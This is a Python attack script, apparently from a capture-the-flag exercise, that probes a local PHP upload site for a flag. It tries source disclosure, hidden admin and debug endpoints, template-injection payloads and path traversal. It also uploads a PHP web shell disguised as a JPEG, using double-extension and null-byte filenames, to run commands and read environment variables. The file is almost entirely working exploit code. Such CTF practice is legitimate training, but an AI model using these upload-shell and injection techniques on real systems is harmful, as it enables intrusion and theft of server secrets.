import requests
import re

base_url = "http://127.0.0.1:33021"

# Minimal valid JPEG
minimal_jpeg = b'\xff\xd8\xff\xd9'

# Test 1: Check if there's a way to read PHP source
print("[*] TEST 1: Try to read index.php source")
r = requests.get(f"{base_url}/index.php", params={'show': 'source', 'debug': '1'})
print(f"[+] Response: {r.text[:500]}")

# Test 2: Check for admin/config endpoints
print("\n[*] TEST 2: Check for admin endpoints")
admin_endpoints = ['/admin', '/config', '/debug', '/phpinfo.php', '/test.php', '/env.php']
for ep in admin_endpoints:
    r = requests.get(f"{base_url}{ep}")
    if r.status_code != 404:
        print(f"[+] {ep}: {r.status_code}")
        if 'FLAG' in r.text:
            print(f"    [!!!] FLAG FOUND!")

# Test 3: Check for Server Side Template Injection
print("\n[*] TEST 3: SSTI test")
ssti_payloads = [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '{{config}}',
]
for payload in ssti_payloads:
    files = {'userfile': ('test.jpg', minimal_jpeg + payload.encode(), 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    match = re.search(r"href='upload/([^']+)'", r.text)
    if match:
        filename = match.group(1)
        r2 = requests.get(f"{base_url}/upload/{filename}")
        if '49' in r2.text or 'FLAG' in r2.text:
            print(f"[!!!] SSTI WORKS: {payload}")
            print(r2.text)

# Test 4: Check for path manipulation via query string
print("\n[*] TEST 4: Query string manipulation")
r = requests.get(f"{base_url}/upload/../index.php")
print(f"[+] Path traversal: {r.status_code}")

# Test 5: Check what happens with double extension
print("\n[*] TEST 5: Double extension handling")
# Apache might process test.php.jpg as PHP if misconfigured
shell = minimal_jpeg + b'<?php system("env | grep FLAG"); ?>'
test_names = [
    'shell.php.jpg',
    'shell.php%00.jpg',
    'shell.php.jpg.php',
    'shell.php;.jpg',
]
for name in test_names:
    files = {'userfile': (name, shell, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    match = re.search(r"href='upload/([^']+)'", r.text)
    if match:
        uploaded = match.group(1)
        r2 = requests.get(f"{base_url}/upload/{uploaded}")
        # Check if PHP executed
        if '<?php' not in r2.text and len(r2.content) > 50:
            print(f"[!!!] PHP MIGHT EXECUTE: {uploaded}")
            print(f"    Content: {r2.text[:200]}")

# Test 6: Check for environment variable leakage
print("\n[*] TEST 6: Environment variable leakage")
r = requests.get(f"{base_url}/")
# Check headers
print(f"[+] Server: {r.headers.get('Server')}")
print(f"[+] X-Powered-By: {r.headers.get('X-Powered-By')}")

# Check for any FLAG in cookies
print(f"[+] Set-Cookie: {r.headers.get('Set-Cookie', 'None')}")

# Test 7: Check for debug parameter
print("\n[*] TEST 7: Debug mode")
debug_params = [{'debug': '1'}, {'debug': 'true'}, {'env': '1'}, {'show_env': '1'}]
for params in debug_params:
    r = requests.get(f"{base_url}/index.php", params=params)
    if 'FLAG' in r.text:
        print(f"[!!!] FLAG FOUND with {params}")
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"FLAGS: {flags}")

# Test 8: Check error messages
print("\n[*] TEST 8: Error message analysis")
r = requests.get(f"{base_url}/upload/nonexistent.php")
print(f"[+] Nonexistent file: {r.status_code} - {r.text[:200]}")

# Test 9: Check if there's a way to trigger PHP in uploaded files
print("\n[*] TEST 9: Force PHP processing via Accept header")
headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
r = requests.get(f"{base_url}/upload/shell.jpg", headers=headers)
print(f"[+] HTML Accept: {r.text[:200]}")

# Test 10: Check the actual server behavior
print("\n[*] TEST 10: Full response analysis")
r = requests.get(f"{base_url}/upload/shell.jpg")
print(f"[+] Status: {r.status_code}")
print(f"[+] Headers: {dict(r.headers)}")
print(f"[+] Content: {r.text}")

